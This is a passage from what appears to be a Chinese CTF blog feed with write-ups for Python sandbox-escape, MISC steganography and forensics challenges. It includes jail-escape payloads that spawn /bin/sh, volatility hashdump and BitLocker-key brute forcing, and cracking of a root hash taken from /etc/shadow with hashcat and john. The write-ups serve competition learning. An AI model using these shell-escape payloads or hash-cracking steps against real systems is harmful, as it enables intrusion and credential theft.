[b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]</code></pre><p>输入payload之后 会不停的重放&#x2F;bin&#x2F;sh  说是无限迭代器 但其实也有次数 手速要快  输入<code> ls cat flag</code> 即可得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805213426632.png" alt="image-20230805213426632"></p><p><strong>NSSCTF{0047e0c3-4c98-4795-aa7f-6e522649c3d6}</strong></p><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)</h2><p>给了一个窗口  先查看黑名单</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214036074.png" alt="image-20230805214036074"></p><p>输入<code>E</code> 可以输入多行命令 但是要求结尾必须是<code>--HNCTF</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214119619.png" alt="image-20230805214119619"></p><p>这时候可以使用函数装饰器<code>@</code> 和类的定义</p><pre><code>@exec@inputclass A: pass</code></pre><p>前两个是函数装饰器: <font color='red'>把带有@的函数放到某个函数的定义处，相当于执行了一次@后的函数</font></p><p>后面是类定义 这里的<code>pass</code>主要作用是占据位置  让代码整体完整 定义空类会报错 </p><p>成功进入main函数主体  在执行命令 进入shell即可</p><pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code></pre><p>读到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221429156.png" alt="image-20230805221429156"></p><p>下面是源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215144009.png" alt="image-20230805215144009"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215207054.png" alt="image-20230805215207054"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春苗进阶考核实操</title>
      <link href="/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/"/>
      <url>/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e05c142ac5af4fbab2b6a8cb105271c11eb9b0b9ecef40dbf4b32a3a2e36b0e2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工控安全培训</title>
      <link href="/2023/07/24/%E5%B7%A5%E6%8E%A7-w3nx1z1/"/>
      <url>/2023/07/24/%E5%B7%A5%E6%8E%A7-w3nx1z1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b1b1fac1b333972d501fd7a517cfad6a05bfb28d8fe25c58790b12ff17d9e2c1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 工控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023巅峰极客MISC题解</title>
      <link href="/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="2023巅峰极客MISC题解"><a href="#2023巅峰极客MISC题解" class="headerlink" title="2023巅峰极客MISC题解"></a>2023巅峰极客MISC题解</h1><p>很遗憾  这次因为某些原因 没能跟随战队一起打全程 虽然但是 也从比赛和战队师傅中学到了很多新东西！！！</p><h2 id="foundme-avif文件-foremost分离"><a href="#foundme-avif文件-foremost分离" class="headerlink" title="foundme(avif文件 foremost分离)"></a>foundme(avif文件 foremost分离)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721204403800.png" alt="image-20230721204403800"></p><p>附件是一个dump文件 以为是普通的内存取证 然而试过了vol2和vol3都没取出东西来 </p><p>在尝试使用windbg <del>太晦涩了不会用</del> 队里做出来的师傅提醒没那么复杂</p><p>于是直接使用010查看 找到了一个hint</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721205503651.png" alt="image-20230721205503651"></p><p>hint:提示寻找Netflix的图片格式 </p><p>搜索发现 Netflix的图片格式是avif文件 直接在附件里面寻avif文件</p><p>kali中使用foremost 分出很多文件 会发现foremost会将avif文件识别为mp4文件(010打开可以看出来) 将mp4的后缀名修改为avif 便可以打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721222601212.png" alt="image-20230721222601212"></p><p><strong>flag{Y0ung_Ju57_f0rward}</strong></p><h2 id="一起学生物-盲水印-二进制转换"><a href="#一起学生物-盲水印-二进制转换" class="headerlink" title="一起学生物(盲水印 二进制转换)"></a>一起学生物(盲水印 二进制转换)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215225168.png" alt="image-20230721215225168"></p><p>附件给了两张图片 一眼盲水印</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215327368.png" alt="image-20230721215327368"></p><p>将结果再放入ps中 很清楚的可以看到<code>甲硫氨酸 </code> 算是一个hint</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215713653.png" alt="image-20230721215713653"></p><p>010打开其中无水印的原图 在文件尾找到一串字符串</p><pre><code>MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM</code></pre><p>搜集相关资料</p><pre><code>甲硫氨酸（Methionine）是一种氨基酸，在蛋白质中通常作为起始氨基酸。具体来说，甲硫氨酸常作为新合成的蛋白质链的第一个氨基酸，即起始氨基酸，通过与核酸的起始密码子（通常是AUG）结合开始蛋白质的合成。在蛋白质合成过程中，mRNA（信使RNA）将遗传信息传递到核糖体，然后核糖体通过三个碱基（密码子）对应一个氨基酸，将氨基酸连接成蛋白质链。甲硫氨酸是这个过程的第一个氨基酸，它位于新合成蛋白质链的起始端。每个氨基酸都由三个碱基（核苷酸）编码，称为密码子。根据上述字符串，我们可以将它分成每三个字母一组，并且从背景知识来看，字符串中可能含有甲硫氨酸（M）作为起始氨基酸。因此，我们可以猜测这段字符串可能是由氨基酸的缩写来表示蛋白质序列的编码。</code></pre><pre><code class="python">input_str=&#39;MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM&#39;po=&#39;&#39;for i,char in enumerate(input_str):    if char==&#39;M&#39;:        po_even=i%2        po+=str(po_even)print(po)# 0110011001101100011000010110011101111011010000010110110100100001011011100011000001011111010000000110001100110001011001000011001101111101</code></pre><p>二进制转字符串出<strong>flag{Am!n0_@c1d3}</strong></p><h2 id="song-deepsound-Ook编码"><a href="#song-deepsound-Ook编码" class="headerlink" title="song(deepsound Ook编码)"></a>song(deepsound Ook编码)</h2><p> foremost分离一下 分出一个zip文件 解压后 在docProps文件中 找到一个thumbnail.jpg图片 thumbnail有缩率图的意思 在图片左上角可以看到一个模糊的zip图标 猜测包含zip文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723113827771.png" alt="image-20230723113827771"></p><p>binwalk一下 提出zip文件 里面有一个加密的flag.txt和password_hint.txt 里面内容是</p><pre><code>9iZ!r@n(9KAQV])&lt;,6_K:,$L-&lt;`N0U&gt;&#39;`J\@;A:f@X:pc;__&lt;N;f-&gt;);/8c[&lt;(K&gt;S=u&amp;Q&lt;&lt;C\oJA2-DK9l+cpAQMnd;/LD5=&amp;s-8@T?rP;cdd&#39;:,$@!;_g1U&lt;ARX#;)&lt;$*;/J0E@P^bo;f-JGAQ3=t:/tFO@r$$s9gs:q@kgl&#39;&lt;`Lh:</code></pre><p>经过base85 base64 base62 base58 base32解码后得到hint</p><pre><code>密码是常见弱口令&#123;******&#125;</code></pre><p>又在zip&#x2F;ppt&#x2F;media里面找到两张看上去相同的图片 放进010里进行对比 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723115132229.png" alt="image-20230723115132229"></p><p>在image4.png尾部发现冗余部分 提取出来</p><p>观察文件头为4D414320(MAC) 是APE文件的文件头</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723154323602.png" alt="image-20230723154323602"></p><p>有密码有音频文件 可以使用deepsound提取隐藏信息 提示密码是常见的六位弱口令 猜测是<code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723174706215.png" alt="image-20230723174706215"></p><p>打开是一段Ook编码 在线网站一把梭 得到压缩包解压密码：<code>QazWsx147!@#</code> 解压得到flag</p><p><strong>flag{lW9tUyrh8RzzvysrswAwY7MHR4mmbLSt}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022蓝帽杯初赛取证复现</title>
      <link href="/2023/07/04/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/04/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022蓝帽杯初赛取证复现"><a href="#2022蓝帽杯初赛取证复现" class="headerlink" title="2022蓝帽杯初赛取证复现"></a>2022蓝帽杯初赛取证复现</h1><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p>下载附件  拿到一个dmp内存镜像和一个E01计算机镜像</p><h3 id="取证一：在内存镜像中的taqi7开机密码为"><a href="#取证一：在内存镜像中的taqi7开机密码为" class="headerlink" title="取证一：在内存镜像中的taqi7开机密码为"></a>取证一：在内存镜像中的taqi7开机密码为</h3><pre><code> .\volatility.exe -f .\1.dmp imageinfo .\volatility.exe -f .\1.dmp --profile=Win7SP1x64 hashdump</code></pre><p>拿到taqi7开机密码的哈希值为：<code>7f21caca5685f10d9e849cc84c340528</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709203653105.png" alt="image-20230709203653105"></p><p><strong>NSSCTF{anxinqi}</strong></p><h3 id="取证二：制作该内存镜像的进程PID号为"><a href="#取证二：制作该内存镜像的进程PID号为" class="headerlink" title="取证二：制作该内存镜像的进程PID号为"></a>取证二：制作该内存镜像的进程PID号为</h3><p>通过搜索 我们可以知道 可以制作内存镜像的进程有：</p><pre><code>dd命令 Win32ddFmemLIMEMagnet RAM Capture</code></pre><pre><code>.\volatility.exe -f .\1.dmp --profile=Win7SP1x64 pslist</code></pre><p>在该内存所有的进程信息中 可以找到<strong>Magnet RAM Capture</strong>的进程PID为<font color='red'>2192</font></p><p><strong>NSSCTF{2192}</strong></p><h3 id="取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？"><a href="#取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？" class="headerlink" title="取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？"></a>取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？</h3><p>首先 有内存镜像 有e01镜像 直接爆破bitlocker密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211136803.png" alt="image-20230709211136803"></p><p>得到bitlocker解密密钥：<strong>368346-029557-428142-651420-492261-552431-515438-338239</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211201839.png" alt="image-20230709211201839"></p><p>在取证大师中解密bitlocker加密分区 提取出两个加密文件 一个密码本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211335882.png" alt="image-20230709211335882"></p><p>使用密码本 进行字典爆破 </p><p>得密码分别为<strong>287fuweiuhfiute</strong> 和 <strong>688561</strong></p><p>从渗透看取证.pptx中有flag</p><p><strong>NSSCTF{b27867b66866866686866883bb43536}</strong></p><h3 id="取证四：TrueCrypt加密中存在的flag值为？"><a href="#取证四：TrueCrypt加密中存在的flag值为？" class="headerlink" title="取证四：TrueCrypt加密中存在的flag值为？"></a>取证四：TrueCrypt加密中存在的flag值为？</h3><p>先用取证大师自带的内存镜像解析工具提取出TC加密容器密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213059097.png" alt="image-20230709213059097"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213153459.png" alt="image-20230709213153459"></p><p>导出密钥文件 在挂载TC加密文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213400070.png" alt="image-20230709213400070"></p><p>发现一个加密zip文件 爆破出密码为：<strong>991314</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213645644.png" alt="image-20230709213645644"></p><p>解压得flag</p><p><strong>NSSCTF{1349934913913991394cacacacacacc}</strong></p><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><h3 id="取证一：627604C2-C586-48C1-AA16-FF33C3022159-PNG图片的分辨率是？"><a href="#取证一：627604C2-C586-48C1-AA16-FF33C3022159-PNG图片的分辨率是？" class="headerlink" title="取证一：627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？"></a>取证一：627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？</h3><p>在附件中有一个<code>苹果测试 查看.exe</code> 在里面直接搜索目标图片 并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/627604C2-C586-48C1-AA16-FF33C3022159.PNG" alt="627604C2-C586-48C1-AA16-FF33C3022159"></p><p>查看图片信息 得到分辨率为<strong>360x360</strong></p><p><strong>NSSCTF{360x360}</strong></p><h3 id="取证二：姜总的快递单号是多少？"><a href="#取证二：姜总的快递单号是多少？" class="headerlink" title="取证二：姜总的快递单号是多少？"></a>取证二：姜总的快递单号是多少？</h3><p>在给的取证测试里面直接搜索<code>姜总</code> 在聊天记录里面找到订单号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711203924882.png" alt="image-20230711203924882"></p><p><strong>NSSCTF{SF1142358694796}</strong></p><h2 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h2><h3 id="取证一：请从网站源码中找出木马文件，并提交木马连接的密码。"><a href="#取证一：请从网站源码中找出木马文件，并提交木马连接的密码。" class="headerlink" title="取证一：请从网站源码中找出木马文件，并提交木马连接的密码。"></a>取证一：请从网站源码中找出木马文件，并提交木马连接的密码。</h3><p>拿到网站源码和部分数据库文件 在解压网站源码时火绒告警</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711151302327.png" alt="image-20230711151302327"></p><p>在虚拟机中打开 找到木马文件 连接密码就是：<code>lanmaobei666</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711151439474.png" alt="image-20230711151439474"></p><p><strong>NSSCTF{lanmaobei666}</strong></p><h3 id="取证二：请提交数据库连接的明文密码"><a href="#取证二：请提交数据库连接的明文密码" class="headerlink" title="取证二：请提交数据库连接的明文密码"></a>取证二：请提交数据库连接的明文密码</h3><p>在WWW&#x2F;application&#x2F;database处 找到数据库密码的明文为<code>my_encrypt()</code> 意思是需要经过这个函数计算之后得到明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711165231681.png" alt="image-20230711165231681"></p><p>在application文件夹下 正好有一个encrypt文件夹 里面正是my_encrypt()函数的解密过程</p><pre><code class="php">&lt;?phpfunction my_encrypt()&#123;    $str = &#39;P3LMJ4uCbkFJ/RarywrCvA==&#39;;    $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str);    $key = &#39;PanGuShi&#39;;    $iv = substr(sha1($key),0,16);    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;);    mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv);    $decode = base64_decode($str);    $dencrypted = mdecrypt_generic($td, $decode);    mcrypt_generic_deinit($td);    mcrypt_module_close($td);    $dencrypted = trim($dencrypted);    return $dencrypted;&#125;</code></pre><p>解密过程是：</p><p>1.总体解密方法为AES解密的CBC模式</p><p>2.解密密钥为<code>PanGuShi</code></p><p>3.偏移值是<code>PanGuShi</code>经过SHA1加密后的前16位</p><p>由此可以进行在线解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711171506060.png" alt="image-20230711171506060"></p><p>数据库连接的明文密码为:<code>KBLT123</code></p><p><strong>NSSCTF{KBLT123}</strong></p><h3 id="取证三：请提交数据库金额加密混淆使用的盐值"><a href="#取证三：请提交数据库金额加密混淆使用的盐值" class="headerlink" title="取证三：请提交数据库金额加密混淆使用的盐值"></a>取证三：请提交数据库金额加密混淆使用的盐值</h3><p>一点点翻源码</p><p>在<code>WWW\application\admin\model\Channelorderlist</code>中找到盐值</p><pre><code class="php">    function decrypt($data, $key = &#39;jyzg123456&#39;)    &#123;        header(&#39;Content-type:text/html;charset=utf-8&#39;);        $key = md5($key);        $x = 0;        $data = base64_decode($data);        $len = mb_strlen($data);        $l = mb_strlen($key);        $char = &#39;&#39;;        $str = &#39;&#39;;        for ($i = 0; $i &lt; $len; $i++) &#123;            if ($x == $l) &#123;                $x = 0;            &#125;            $char .= mb_substr($key, $x, 1);            $x++;        &#125;        for ($i = 0; $i &lt; $len; $i++) &#123;            if (ord(mb_substr($data, $i, 1)) &lt; ord(mb_substr($char, $i, 1))) &#123;                $str .= chr((ord(mb_substr($data, $i, 1)) + 256) - ord(mb_substr($char, $i, 1)));            &#125; else &#123;                $str .= chr(ord(mb_substr($data, $i, 1)) - ord(mb_substr($char, $i, 1)));            &#125;        &#125;        return $str;    &#125;</code></pre><p><strong>NSSCTF{jyzg123456}</strong></p><h3 id="取证四：请计算张宝在北京时间2022-04-02-00-00-00-2022-04-18-23-59-59累计转账给王子豪多少RMB？"><a href="#取证四：请计算张宝在北京时间2022-04-02-00-00-00-2022-04-18-23-59-59累计转账给王子豪多少RMB？" class="headerlink" title="取证四：请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？"></a>取证四：请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？</h3><p>在数据库中提取2到18号的交易记录 2到18号每天GG币和RMB的汇率 </p><p>翻找数据库 发现 张宝的用户id为3 王子豪的用户id为5 </p><p>在交易记录的倒数第三位和倒数第二位分别为收款人和付款人 所以匹配含有数据(5,3)的交易记录 再将每天GG币的数量 脱盐解密 乘上汇率 汇总就是转账的RMB</p><pre><code class="python">import base64import hashlibdef decrypt(data):    key  = hashlib.md5()    key.update(b&#39;jyzg123456&#39;)    key = key.hexdigest()    x = 0    data = base64.b64decode(data)    Len = len(data)    l = len(key)    char = &quot;&quot;    str = &quot;&quot;    for i in range(Len):        if(x==l):            x = 0        char+=key[x:x+1]        x+=1    i =0    for i in range(Len):        if(ord(data[i:i+1])&lt;ord(char[i:i+1])):            str+=chr(ord(data[i:i+1]+256)-ord(char[i:i+1]))        else:            str+=chr(ord(data[i:i+1])-ord(char[i:i+1]))    return strdata = &quot;&quot;huilv = [0,0,0.04,0.06,0.05,0.07,0.10,0.15,0.17,0.23,0.22,0.25,0.29,0.20,0.28,0.33,0.35,0.35,0.37]money = 0Money = 0with open(&quot;./flag.txt&quot;,&quot;r&quot;,encoding=&#39;utf-8&#39;) as file:    data = file.readlines()for line in data:    if(int(line.split(&#39;,&#39;)[5])==5 and int(line.split(&#39;,&#39;)[6])==3):        Data = int(line.split(&#39;,&#39;)[4][10:12])        money = line.split(&#39;,&#39;)[7][2:10]        tmpmoney = huilv[Data]*int(decrypt(money))        Money += tmpmoney        print(Data,huilv[Data],decrypt(money),tmpmoney,line.split(&#39;,&#39;)[5],line.split(&#39;,&#39;)[6])print(&quot;最后金额&quot;,Money)</code></pre><p><strong>NSSCTF{15758353.76}</strong></p><h2 id="程序取证"><a href="#程序取证" class="headerlink" title="程序取证"></a>程序取证</h2><h3 id="取证一：本程序包名是？"><a href="#取证一：本程序包名是？" class="headerlink" title="取证一：本程序包名是？"></a>取证一：本程序包名是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230712215022357.png" alt="image-20230712215022357"></p><p><strong>NSSCTF{exec.azj.kny.d.c}</strong></p><h3 id="取证二：本程序的入口是？"><a href="#取证二：本程序的入口是？" class="headerlink" title="取证二：本程序的入口是？"></a>取证二：本程序的入口是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230712220703890.png" alt="image-20230712220703890"></p><p>Android程序的入口就是<code>Main Activity函数</code></p><p><code>package</code>的值就是程序入口 记得后面加上<code>MainActivity</code></p><p><strong>NSSCTF{minmtta.hemjcbm.ahibyws.MainActivity}</strong></p><h3 id="取证三：本程序的服务器地址的密文是？"><a href="#取证三：本程序的服务器地址的密文是？" class="headerlink" title="取证三：本程序的服务器地址的密文是？"></a>取证三：本程序的服务器地址的密文是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716125210431.png" alt="image-20230716125210431"></p><p>直接找到服务器地址的密文：</p><p><strong>NSSCTF{aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6}</strong></p><h3 id="取证四：本程序实现安全检测的类的名称是："><a href="#取证四：本程序实现安全检测的类的名称是：" class="headerlink" title="取证四：本程序实现安全检测的类的名称是："></a>取证四：本程序实现安全检测的类的名称是：</h3><p>全局搜索 <strong>“安全”</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716124708919.png" alt="image-20230716124708919"></p><p>这里引用了一个d.a.a.c.a.a()函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716151334870.png" alt="image-20230716151334870"></p><p>找到该函数 发现定义的类就是<code>a</code></p><p><strong>NSSCTF{a}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 12 Misc 专场</title>
      <link href="/2023/06/04/NSSRound%2012%20Misc%20%E4%B8%93%E5%9C%BA/"/>
      <url>/2023/06/04/NSSRound%2012%20Misc%20%E4%B8%93%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-12-Misc-专场"><a href="#NSSRound-12-Misc-专场" class="headerlink" title="NSSRound 12 Misc 专场"></a>NSSRound 12 Misc 专场</h1><h2 id="Secrets-in-Shadow-linux提权"><a href="#Secrets-in-Shadow-linux提权" class="headerlink" title="Secrets in Shadow(linux提权 )"></a>Secrets in Shadow(linux提权 )</h2><p>首先ssh远程连接上主机  直接看目录 发现flag文件  但是没有权限访问 需要进行提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230528085116572.png" alt="image-20230528085116572"></p><p><strong>我们现在需要寻找的是root权限的密码 登陆root 获得读取flag的权限</strong></p><p>通过查看&#x2F;etc&#x2F;shadow文件  可以得到root密码的哈希值</p><pre><code>$6$Vh57Xwpz34U8wthL$Xd0QAbWlZgB4nOhgDPCR/Q50rhAUsVVkIs3MUiglBlMychQjULqAADyTSzTXNuuF0TO.2TzUi574DHY6e8Fma1</code></pre><pre><code>hashcat -m 1800 -a 0 -o value.txt hash rockyou.txt # value.txt是存放爆破结果的文件 hash存放想要爆破的哈希值 rockyou.txt是字典文件</code></pre><p><strong>再补充一下john爆破的命令：</strong></p><pre><code>john --wordlist=字典地址 --user=要爆破密码的用户名 哈希文件 保存结果的文件</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603173158932.png" alt="image-20230603173158932"></p><p><strong>得到密码为：bullshit</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603173457813.png" alt="image-20230603173457813"></p><p>**:horse:NSSCTF{6011c959-50a4-4761-b08a-76c87a7c9e37}**s</p><h2 id="ordinary-forensics-内存取证-挂载ext系统磁盘"><a href="#ordinary-forensics-内存取证-挂载ext系统磁盘" class="headerlink" title="ordinary forensics(内存取证 挂载ext系统磁盘)"></a>ordinary forensics(内存取证 挂载ext系统磁盘)</h2><p>打开之后有一个内存镜像一个unknown文件</p><p>首先进行内存取证 发现可以使用volatility2进行取证</p><pre><code>volatility -f  forensics.raw imageinfo  #获得内存镜像的操作系统版本</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230602094324154.png" alt="image-20230602094324154"></p><pre><code>volatility -f  forensics.raw --profile==Win7SP1x64 cmdscan #提取镜像中cmd命令的使用情况</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230602094452525.png" alt="image-20230602094452525"></p><p>找到一个password：U_find_1t</p><p>那面下面的目标就是要找压缩包了  但其实应该是png txt jpg 等可能的证据文件都提取一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084225877.png" alt="image-20230603084225877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084358692.png" alt="image-20230603084358692"></p><p>hint.txt里面提到vera</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084433823.png" alt="image-20230603084433823"></p><p>useful.zip使用上面找到的password解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084519072.png" alt="image-20230603084519072"></p><p>猜测是使用useful.txt挂载vc容器  得到一个secret</p><p>首先查看文件类型：是ext3系统磁盘文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603162203998.png" alt="image-20230603162203998"></p><p>进行挂载 查看磁盘内文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603162308535.png" alt="image-20230603162308535"></p><p>压缩包内提示 密码为username_hostname 显然问的是内存镜像中的信息 再回去对信息进行提取</p><pre><code>volatility -f forensics.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot; # 查看系统用户名volatility -f forensics.raw --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot; # 查看计算机名</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603163308057.png" alt="image-20230603163308057"></p><p>得到解压密码：Mario_Princess-Peach</p><p>:horse:<strong>NSSCTF{f0rens1cs_1s_Interesting}</strong> </p><h2 id="Bulbasaur-盲水印-阴阳怪气编码"><a href="#Bulbasaur-盲水印-阴阳怪气编码" class="headerlink" title="Bulbasaur(盲水印 阴阳怪气编码)"></a>Bulbasaur(盲水印 阴阳怪气编码)</h2><p>有题目描述可以猜测是盲水印 使用工具一把梭 <strong>得到：blind watermark</strong>   空格多试几次就看出来了 这就是压缩包的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603184810342.png" 